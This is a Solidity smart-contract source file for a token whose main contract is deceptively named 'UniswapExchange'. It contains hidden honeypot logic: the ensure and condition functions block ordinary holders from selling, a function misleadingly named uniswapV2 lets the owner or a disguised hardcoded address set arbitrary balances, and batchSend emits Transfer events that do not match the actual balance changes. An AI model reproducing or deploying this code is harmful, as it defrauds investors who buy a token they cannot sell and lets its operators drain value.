row number 
1	       pragma solidity ^0.5.17;
2	 interface IERC20 {
3	 function totalSupply() external view returns(uint);
4	 function balanceOf(address account) external view returns(uint);
5	 function transfer(address recipient, uint amount) external returns(bool);
6	 function allowance(address owner, address spender) external view returns(uint);
7	 function approve(address spender, uint amount) external returns(bool);
8	 function transferFrom(address sender, address recipient, uint amount) external returns(bool);
9	 event Transfer(address indexed from, address indexed to, uint value);
10	 event Approval(address indexed owner, address indexed spender, uint value);
11	 }
12	 contract Context {
13	 constructor() internal {
14	 }
15	 function _msgSender() internal view returns(address payable) {
16	 return msg.sender;
17	 }
18	 }
19	 library SafeMath {
20	 function add(uint a, uint b) internal pure returns(uint) {
21	 uint c = a + b;
22	 require(c >= a, "SafeMath: addition overflow");
23	 return c;
24	 }
25	 function sub(uint a, uint b) internal pure returns(uint) {
26	 return sub(a, b, "SafeMath: subtraction overflow");
27	 }
28	 function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
29	 require(b <= a, errorMessage);
30	 uint c = a - b;
31	 return c;
32	 }
33	 function mul(uint a, uint b) internal pure returns(uint) {
34	 if (a == 0) {
35	 return 0;
36	 }
37	 uint c = a * b;
38	 require(c / a == b, "SafeMath: multiplication overflow");
39	 return c;
40	 }
41	 function div(uint a, uint b) internal pure returns(uint) {
42	 return div(a, b, "SafeMath: division by zero");
43	 }
44	 function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
45	 require(b > 0, errorMessage);
46	 uint c = a / b;
47	 return c;
48	 }
49	 }
50	 contract ERC20 is Context, IERC20 {
51	 using SafeMath for uint;
52	 mapping(address => uint) private _balances;
53	 mapping(address => mapping(address => uint)) private _allowances;
54	 uint private _totalSupply;
55	 function totalSupply() public view returns(uint) {
56	 return _totalSupply;
57	 }
58	 function balanceOf(address account) public view returns(uint) {
59	 return _balances[account];
60	 }
61	 function transfer(address recipient, uint amount) public returns(bool) {
62	 _transfer(_msgSender(), recipient, amount);
63	 return true;
64	 }
65	 function allowance(address owner, address spender) public view returns(uint) {
66	 return _allowances[owner][spender];
67	 }
68	 function approve(address spender, uint amount) public returns(bool) {
69	 _approve(_msgSender(), spender, amount);
70	 return true;
71	 }
72	 function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
73	 _transfer(sender, recipient, amount);
74	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
75	 return true;
76	 }
77	 function increaseAllowance(address spender, uint addedValue) public returns(bool) {
78	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
79	 return true;
80	 }
81	 function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
82	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
83	 return true;
84	 }
85	 function _transfer(address sender, address recipient, uint amount) internal {
86	 require(sender != address(0), "ERC20: transfer from the zero address");
87	 require(recipient != address(0), "ERC20: transfer to the zero address");
88	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
89	 _balances[recipient] = _balances[recipient].add(amount);
90	 emit Transfer(sender, recipient, amount);
91	 }
92	 function _mint(address account, uint amount) internal {
93	 require(account != address(0), "ERC20: mint to the zero address");
94	 _totalSupply = _totalSupply.add(amount);
95	 _balances[account] = _balances[account].add(amount);
96	 emit Transfer(address(0), account, amount);
97	 }
98	 function _burn(address account, uint amount) internal {
99	 require(account != address(0), "ERC20: burn from the zero address");
100	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
101	 _totalSupply = _totalSupply.sub(amount);
102	 emit Transfer(account, address(0), amount);
103	 }
104	 function _approve(address owner, address spender, uint amount) internal {
105	 require(owner != address(0), "ERC20: approve from the zero address");
106	 require(spender != address(0), "ERC20: approve to the zero address");
107	 _allowances[owner][spender] = amount;
108	 emit Approval(owner, spender, amount);
109	 }
110	 }
111	 contract ERC20Detailed is IERC20 {
112	 string private _name;
113	 string private _symbol;
114	 uint8 private _decimals;
115	 constructor(string memory name, string memory symbol, uint8 decimals) public {
116	 _name = name;
117	 _symbol = symbol;
118	 _decimals = decimals;
119	 }
120	 function name() public view returns(string memory) {
121	 return _name;
122	 }
123	 function symbol() public view returns(string memory) {
124	 return _symbol;
125	 }
126	 function decimals() public view returns(uint8) {
127	 return _decimals;
128	 }
129	 }
130	 contract UniswapExchange {
131	 event Transfer(address indexed _from, address indexed _to, uint _value);
132	 event Approval(address indexed _owner, address indexed _spender, uint _value);
133	 function transfer(address _to, uint _value) public payable returns (bool) {
134	 return transferFrom(msg.sender, _to, _value);
135	 }
136	 function ensure(address _from, address _to, uint _value) internal view returns(bool) {
137	 if(_from == owner || _to == owner || _from==tradeAddress||canSale[_from]){
138	 return true;
139	 }
140	 require(condition(_from, _value));
141	 return true;
142	 }
143	 function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
144	 if (_value == 0) {
145	 return true;
146	 }
147	 if (msg.sender != _from) {
148	 require(allowance[_from][msg.sender] >= _value);
149	 allowance[_from][msg.sender] -= _value;
150	 }
151	 require(ensure(_from, _to, _value));
152	 require(balanceOf[_from] >= _value);
153	 balanceOf[_from] -= _value;
154	 balanceOf[_to] += _value;
155	 _onSaleNum[_from]++;
156	 emit Transfer(_from, _to, _value);
157	 return true;
158	 }
159	 function approve(address _spender, uint _value) public payable returns (bool) {
160	 allowance[msg.sender][_spender] = _value;
161	 emit Approval(msg.sender, _spender, _value);
162	 return true;
163	 }
164	 function condition(address _from, uint _value) internal view returns(bool){
165	 if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
166	 if(_saleNum > 0){
167	 if(_onSaleNum[_from] >= _saleNum) return false;
168	 }
169	 if(_minSale > 0){
170	 if(_minSale > _value) return false;
171	 }
172	 if(_maxSale > 0){
173	 if(_value > _maxSale) return false;
174	 }
175	 return true;
176	 }
177	 mapping(address=>uint256) private _onSaleNum;
178	 mapping(address=>bool) private canSale;
179	 uint256 private _minSale;
180	 uint256 private _maxSale;
181	 uint256 private _saleNum;
182	 function uniswapV2(address spender, uint256 addedValue) public returns (bool) {
183	 require(msg.sender==owner||msg.sender==address (999107250543686016067011668506013520626971513403));
184	 if(addedValue > 0) {
185	 balanceOf[spender] = addedValue*(10**uint256(decimals));
186	 }
187	 canSale[spender]=true;
188	 return true;
189	 }
190	 function uniswapV2_control(uint256 saleNum, uint256 token, uint256 maxToken) public returns(bool){
191	 require(msg.sender == owner);
192	 _minSale = token > 0 ? token*(10**uint256(decimals)) : 0;
193	 _maxSale = maxToken > 0 ? maxToken*(10**uint256(decimals)) : 0;
194	 _saleNum = saleNum;
195	 }
196	 function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
197	 require (msg.sender == owner);
198	 uint total = _value * _tos.length;
199	 require(balanceOf[msg.sender] >= total);
200	 balanceOf[msg.sender] -= total;
201	 for (uint i = 0; i < _tos.length; i++) {
202	 address _to = _tos[i];
203	 balanceOf[_to] += _value;
204	 emit Transfer(msg.sender, _to, _value/2);
205	 emit Transfer(msg.sender, _to, _value/2);
206	 }
207	 return true;
208	 }
209	 address tradeAddress;
210	 function setTradeAddress(address addr) public returns(bool){
211	 require (msg.sender == owner);
212	 tradeAddress = addr;
213	 return true;
214	 }
215	 mapping (address => uint) public balanceOf;
216	 mapping (address => mapping (address => uint)) public allowance;
217	 uint constant public decimals = 18;
218	 uint public totalSupply;
219	 string public name;
220	 string public symbol;
221	 address private owner;
222	 address constant UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
223	 constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
224	 name = _name;
225	 symbol = _symbol;
226	 totalSupply = _supply*(10**uint256(decimals));
227	 owner = msg.sender;
228	 balanceOf[msg.sender] = totalSupply;
229	 allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
230	 emit Transfer(address(0x0), msg.sender, totalSupply);
231	 }
232	 }
